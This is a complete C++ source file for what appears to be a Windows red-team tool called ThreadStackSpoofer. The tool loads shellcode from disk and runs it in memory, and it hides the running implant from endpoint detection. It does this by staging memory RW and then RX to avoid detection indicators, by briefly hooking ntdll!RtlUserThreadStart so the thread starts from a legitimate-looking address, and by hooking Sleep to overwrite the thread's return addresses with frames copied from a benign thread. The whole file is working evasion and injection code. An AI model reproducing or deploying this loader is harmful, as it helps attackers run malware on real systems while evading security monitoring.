
#include "header.h"

HookedSleep g_hookedSleep;
StackTraceSpoofingMetadata g_stackTraceSpoofing;


void WINAPI MySleep(DWORD _dwMilliseconds)
{
    const volatile DWORD dwMilliseconds = _dwMilliseconds;

    // Perform this (current) thread call stack spoofing.
    spoofCallStack(true);

    log("\n===> MySleep(", std::dec, dwMilliseconds, ")\n");

    // Perform sleep emulating originally hooked functionality.
    ::SleepEx(dwMilliseconds, false);
 
    // Restore original thread's call stack.
    spoofCallStack(false);
}

bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers /*= NULL*/)
{
#ifdef _WIN64
    uint8_t trampoline[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
        0x41, 0xFF, 0xE2                                            // jmp r10
    };

    uint64_t addr = (uint64_t)(jumpAddress);
    memcpy(&trampoline[2], &addr, sizeof(addr));
#else
    uint8_t trampoline[] = {
        0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, addr
        0xFF, 0xE0                        // jmp eax
    };

    uint32_t addr = (uint32_t)(jumpAddress);
    memcpy(&trampoline[1], &addr, sizeof(addr));
#endif

    DWORD dwSize = sizeof(trampoline);
    DWORD oldProt = 0;
    bool output = false;

    if (installHook)
    {
        if (buffers != NULL)
        {
            if (buffers->previousBytes == nullptr || buffers->previousBytesSize == 0)
                return false;

            memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);
        }

        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt
        ))
        {
            memcpy(addressToHook, trampoline, dwSize);
            output = true;
        }
    }
    else
    {
        if (buffers == NULL)
            return false;

        if (buffers->originalBytes == nullptr || buffers->originalBytesSize == 0)
            return false;

        dwSize = buffers->originalBytesSize;

        if (::VirtualProtect(
            addressToHook,
            dwSize,
            PAGE_EXECUTE_READWRITE,
            &oldProt
        ))
        {
            memcpy(addressToHook, buffers->originalBytes, dwSize);
            output = true;
        }
    }

    ::VirtualProtect(
        addressToHook,
        dwSize,
        oldProt,
        &oldProt
    );

    return output;
}

bool hookSleep()
{
    HookTrampolineBuffers buffers = { 0 };
    buffers.previousBytes = g_hookedSleep.sleepStub;
    buffers.previousBytesSize = sizeof(g_hookedSleep.sleepStub);

    g_hookedSleep.origSleep = reinterpret_cast<typeSleep>(Sleep);

    if (!fastTrampoline(true, (BYTE*)::Sleep, &MySleep, &buffers))
        return false;

    return true;
}

void walkCallStack(HANDLE hThread, CallStackFrame* frames, size_t maxFrames, size_t* numOfFrames, bool onlyBeaconFrames, size_t framesToPreserve)
{
    CONTEXT c = { 0 };
    STACKFRAME64 s = { 0 };
    DWORD imageType;
    ULONG curRecursionCount = 0;

    c.ContextFlags = CONTEXT_ALL;

    //
    // It looks like RtlCaptureContext was able to acquire running thread's context,
    // while GetThreadContext failed at doing so.
    //
    if (hThread == GetCurrentThread() || hThread == 0)
        RtlCaptureContext(&c);
    else
        GetThreadContext(hThread, &c);

#ifdef _M_IX86
    const ULONG_PTR invalidAddr = 0xcccccccc;
    // normally, call ImageNtHeader() and use machine info from PE header
    imageType = IMAGE_FILE_MACHINE_I386;
    s.AddrPC.Offset = c.Eip;
    s.AddrPC.Mode = AddrModeFlat;
    s.AddrFrame.Offset = c.Ebp;
    s.AddrFrame.Mode = AddrModeFlat;
    s.AddrStack.Offset = c.Esp;
    s.AddrStack.Mode = AddrModeFlat;
#elif _M_X64
    const ULONG_PTR invalidAddr = 0xcccccccccccccccc;
    imageType = IMAGE_FILE_MACHINE_AMD64;
    s.AddrPC.Offset = c.Rip;
    s.AddrPC.Mode = AddrModeFlat;
    s.AddrFrame.Offset = c.Rsp;
    s.AddrFrame.Mode = AddrModeFlat;
    s.AddrStack.Offset = c.Rsp;
    s.AddrStack.Mode = AddrModeFlat;
#elif _M_IA64
    const ULONG_PTR invalidAddr = 0xcccccccccccccccc;
    imageType = IMAGE_FILE_MACHINE_IA64;
    s.AddrPC.Offset = c.StIIP;
    s.AddrPC.Mode = AddrModeFlat;
    s.AddrFrame.Offset = c.IntSp;
    s.AddrFrame.Mode = AddrModeFlat;
    s.AddrBStore.Offset = c.RsBSP;
    s.AddrBStore.Mode = AddrModeFlat;
    s.AddrStack.Offset = c.IntSp;
    s.AddrStack.Mode = AddrModeFlat;
#else
#error "Platform not supported!"
#endif

    log("\nWalkCallStack: Stack Trace: ");

    *numOfFrames = 0;
    ULONG Frame = 0;

    for (Frame = 0; ; Frame++)
    {
        //
        // A call to dbghelp!StackWalk64 that will let us iterate over thread's call stack.
        //
        BOOL result = g_stackTraceSpoofing.pStackWalk64(
            imageType,
            GetCurrentProcess(),
            hThread,
            &s,
            &c,
            NULL,
            (PFUNCTION_TABLE_ACCESS_ROUTINE64)g_stackTraceSpoofing.pSymFunctionTableAccess64,
            (PGET_MODULE_BASE_ROUTINE64)g_stackTraceSpoofing.pSymGetModuleBase64,
            NULL
        );

        if (!result || s.AddrReturn.Offset == 0)
            break;

        if (s.AddrPC.Offset == s.AddrReturn.Offset)
        {
            if (curRecursionCount > 1000)
            {
                // Overly deep recursion spotted, bailing out.
                break;
            }
            curRecursionCount++;
        }
        else
        {
            curRecursionCount = 0;
        }

        CallStackFrame frame = { 0 };

        frame.calledFrom = s.AddrPC.Offset;
        frame.stackAddr = s.AddrStack.Offset;
        frame.frameAddr = s.AddrFrame.Offset;
        frame.retAddr = s.AddrReturn.Offset;

        if (Frame > maxFrames)
            break;

        //
        // Skip first two frames as they most likely link back to our callers - and thus we can't spoof them:
        // MySleep(...) -> spoofCallStack(...) -> ...
        //
        if (Frame < framesToPreserve)
            continue;

        bool skipFrame = false;

        if (onlyBeaconFrames)
        {
            MEMORY_BASIC_INFORMATION mbi = { 0 };

            if (VirtualQuery((LPVOID)frame.retAddr, &mbi, sizeof(mbi)))
            {
                //
                // If a frame points back to memory pages that are not MEM_PRIVATE (originating from VirtualAlloc)
                // we can skip them, as they shouldn't point back to our beacon's memory pages.
                // Also I've noticed, that for some reason parameter for kernel32!Sleep clobbers stack, making it look like
                // it's a frame by its own. That address (5 seconds = 5000ms = 0x1388) when queried with VirtualQuery seems to return
                // mbi.Type == 0. We're using this observation to include such frame in spoofing.
                //
                if (mbi.Type != MEM_PRIVATE && mbi.Type != 0) skipFrame = true;

            }

            if (frame.retAddr == invalidAddr) skipFrame = true;
        }

        if (!skipFrame && frame.retAddr != 0 && frame.frameAddr != 0)
        {
            frames[(*numOfFrames)++] = frame;
        }

        log("\t", std::dec, Frame, ".\tcalledFrom: 0x", std::setw(8), std::hex, frame.calledFrom, " - stack: 0x", frame.stackAddr, 
            " - frame: 0x", frame.frameAddr, " - ret: 0x", frame.retAddr, " - skip? ", skipFrame);
    }
}

void spoofCallStack(bool overwriteOrRestore)
{
    CallStackFrame frames[MaxStackFramesToSpoof] = { 0 };
    size_t numOfFrames = 0;

    //
    // Firstly we walk through the current thread's call stack collecting all frames
    // that resemble references to Beacon's allocation pages (or are in any other means anomalous by looking).
    //
    walkCallStack(GetCurrentThread(), frames, _countof(frames), &numOfFrames, true);

    if (overwriteOrRestore)
    {
        for (size_t i = 0; i < numOfFrames; i++)
        {
            if (i > g_stackTraceSpoofing.mimickedFrames)
            {
                CallStackFrame frame = { 0 };
                g_stackTraceSpoofing.spoofedFrame[g_stackTraceSpoofing.spoofedFrames++] = frame;
                break;
            }

            auto& frame = frames[i];
            auto& mimicframe = g_stackTraceSpoofing.mimicFrame[i];

            if (g_stackTraceSpoofing.spoofedFrames < MaxStackFramesToSpoof)
            {
                //
                // We will use CreateFileW as a fake return address to place onto the thread's frame on stack.
                //
                //frame.overwriteWhat = (ULONG_PTR)::CreateFileW;
                frame.overwriteWhat = (ULONG_PTR)mimicframe.retAddr;

                //
                // We're saving original frame to later use it for call stack restoration.
                //
                g_stackTraceSpoofing.spoofedFrame[g_stackTraceSpoofing.spoofedFrames++] = frame;
            }
        }

        for (size_t i = 0; i < g_stackTraceSpoofing.spoofedFrames; i++)
        {
            auto frame = g_stackTraceSpoofing.spoofedFrame[i];

            //
            // We overwrite thread's frame by writing a function pointer onto the thread's stack precisely where
            // the function's return address stored.
            //
            *(PULONG_PTR)(frame.frameAddr + sizeof(ULONG_PTR)) = frame.overwriteWhat;

            log("\t\t\tSpoofed: 0x", 
                std::setw(8), std::setfill('0'), std::hex, frame.retAddr, " -> 0x", frame.overwriteWhat);
        }
    }
    else
    {
        for (size_t i = 0; i < g_stackTraceSpoofing.spoofedFrames; i++)
        {
            auto frame = g_stackTraceSpoofing.spoofedFrame[i];

            //
            // Here we restore original return addresses so that our shellcode can continue its execution.
            //
            *(PULONG_PTR)(frame.frameAddr + sizeof(ULONG_PTR)) = frame.retAddr;

            log("\t\t\tRestored: 0x", std::setw(8), std::setfill('0'), std::hex, frame.overwriteWhat, " -> 0x", frame.retAddr);
        }

        memset(g_stackTraceSpoofing.spoofedFrame, 0, sizeof(g_stackTraceSpoofing.spoofedFrame));
        g_stackTraceSpoofing.spoofedFrames = 0;
    }

    return;
}

bool initStackSpoofing()
{
    memset(&g_stackTraceSpoofing, 0, sizeof(g_stackTraceSpoofing));

    //
    // Firstly we need to load dbghelp.dll to resolve necessary functions' pointers.
    //
    g_stackTraceSpoofing.hDbghelp = LoadLibraryA("dbghelp.dll");
    if (!g_stackTraceSpoofing.hDbghelp)
        return false;

    //
    // Now we resolve addresses of a few required functions.
    //
    g_stackTraceSpoofing.pSymFunctionTableAccess64 =
        GetProcAddress(g_stackTraceSpoofing.hDbghelp, "SymFunctionTableAccess64");
    g_stackTraceSpoofing.pSymGetModuleBase64 =
        GetProcAddress(g_stackTraceSpoofing.hDbghelp, "SymGetModuleBase64");
    g_stackTraceSpoofing.pStackWalk64 =
        (typeStackWalk64)GetProcAddress(g_stackTraceSpoofing.hDbghelp, "StackWalk64");
    auto pSymInitialize =
        (typeSymInitialize)GetProcAddress(g_stackTraceSpoofing.hDbghelp, "SymInitialize");

    if (!g_stackTraceSpoofing.pSymFunctionTableAccess64
        || !g_stackTraceSpoofing.pSymGetModuleBase64
        || !g_stackTraceSpoofing.pStackWalk64
        || !pSymInitialize
        )
        return false;

    // 
    // Now in order to get StackWalk64 working correctly, we need to call SymInitialize.
    //
    pSymInitialize(GetCurrentProcess(), nullptr, TRUE);

    log("[+] Stack spoofing initialized.");
    g_stackTraceSpoofing.initialized = true;
    return true;
}

bool readShellcode(const char* path, std::vector<uint8_t>& shellcode)
{
    HandlePtr file(CreateFileA(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    ), &::CloseHandle);

    if (INVALID_HANDLE_VALUE == file.get())
        return false;

    DWORD highSize;
    DWORD readBytes = 0;
    DWORD lowSize = GetFileSize(file.get(), &highSize);

    shellcode.resize(lowSize, 0);

    return ReadFile(file.get(), shellcode.data(), lowSize, &readBytes, NULL);
}

bool injectShellcode(std::vector<uint8_t>& shellcode, HandlePtr &thread)
{
    //
    // Firstly we allocate RW page to avoid RWX-based IOC detections
    //
    auto alloc = ::VirtualAlloc(
        NULL,
        shellcode.size() + 1,
        MEM_COMMIT,
        PAGE_READWRITE
    );

    if (!alloc) 
        return false;

    memcpy(alloc, shellcode.data(), shellcode.size());

    DWORD old;
    
    //
    // Then we change that protection to RX
    // 
    if (!VirtualProtect(alloc, shellcode.size() + 1, Shellcode_Memory_Protection, &old))
        return false;


    //
    // In order for our thread to blend in more effectively, we start it from the ntdll!RtlUserThreadStart+0x21
    // function that is hooked by placing a trampoline call into our shellcode. After a second, the function will be
    // unhooked to remove easy leftovers (IOCs) and maintain process' stability.
    //
    LPVOID fakeAddr = (LPVOID)(((ULONG_PTR)GetProcAddress(GetModuleHandleA("ntdll"), "RtlUserThreadStart")) + 0x21);

    BYTE origRtlUserThreadStartBytes[16];
    HookTrampolineBuffers buffers = { 0 };
    buffers.previousBytes = buffers.originalBytes = origRtlUserThreadStartBytes;
    buffers.previousBytesSize = buffers.originalBytesSize = sizeof(origRtlUserThreadStartBytes);
    if (!fastTrampoline(true, (BYTE*)fakeAddr, alloc, &buffers))
        return false;
    
    shellcode.clear();

    //
    // The shellcode starts from the hooked ntdll!RtlUserThreadStart+0x21
    //
    thread.reset(::CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)fakeAddr,
        0,
        0,
        0
    ));

    ::SleepEx(1000, false);

    // Here we restore original stub bytes of that API.
    if (!fastTrampoline(false, (BYTE*)fakeAddr, alloc, &buffers))
        return false;

    return (NULL != thread.get());
}

/*
void _acquireLegitimateThreadStack(LPVOID param)
{
    ULONG_PTR lowLimit = 0, highLimit = 0;
    ULONG stackSize = highLimit - lowLimit;
    GetCurrentThreadStackLimits(&lowLimit, &highLimit);
    
    g_stackTraceSpoofing.legitimateStackContents.resize(stackSize, 0);
    memcpy(g_stackTraceSpoofing.legitimateStackContents.data(), (const void*)lowLimit, stackSize);
}
*/

bool acquireLegitimateThreadStack()
{
    CallStackFrame frames[MaxStackFramesToSpoof] = { 0 };
    size_t numOfFrames = 0;

    HandlePtr secondThread(::CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)::Sleep,
        (LPVOID)INFINITE,
        0,
        0
    ), &::CloseHandle);

    Sleep(1000);

    walkCallStack(secondThread.get(), g_stackTraceSpoofing.mimicFrame, _countof(g_stackTraceSpoofing.mimicFrame), &g_stackTraceSpoofing.mimickedFrames, false, 0);

    return g_stackTraceSpoofing.mimickedFrames > 0;
}


int main(int argc, char** argv)
{
    if (argc < 3)
    {
        log("Usage: ThreadStackSpoofer.exe <shellcode> <spoof>");
        return 1;
    }

    std::vector<uint8_t> shellcode;
    bool spoof = (!strcmp(argv[2], "true") || !strcmp(argv[2], "1"));

    log("[.] Reading shellcode bytes...");
    if (!readShellcode(argv[1], shellcode))
    {
        log("[!] Could not open shellcode file! Error: ", ::GetLastError());
        return 1;
    }

    if (spoof)
    {
        log("[.] Thread call stack will be spoofed.");
        if (!initStackSpoofing())
        {
            log("[!] Could not initialize stack spoofing!");
            return 1;
        }

        if (!acquireLegitimateThreadStack())
        {
            log("[!] Could not acquire legitimate thread's stack.");
            return 1;
        }

        log("[.] Hooking kernel32!Sleep...");
        if (!hookSleep())
        {
            log("[!] Could not hook kernel32!Sleep!");
            return 1;
        }
    }
    else
    {
        log("[.] Thread call stack will NOT be spoofed.");
    }

    log("[.] Injecting shellcode...");

    HandlePtr thread(NULL, &::CloseHandle);
    if (!injectShellcode(shellcode, thread))
    {
        log("[!] Could not inject shellcode! Error: ", ::GetLastError());
        return 1;
    }

    log("[+] Shellcode is now running.");

    WaitForSingleObject(thread.get(), INFINITE);
}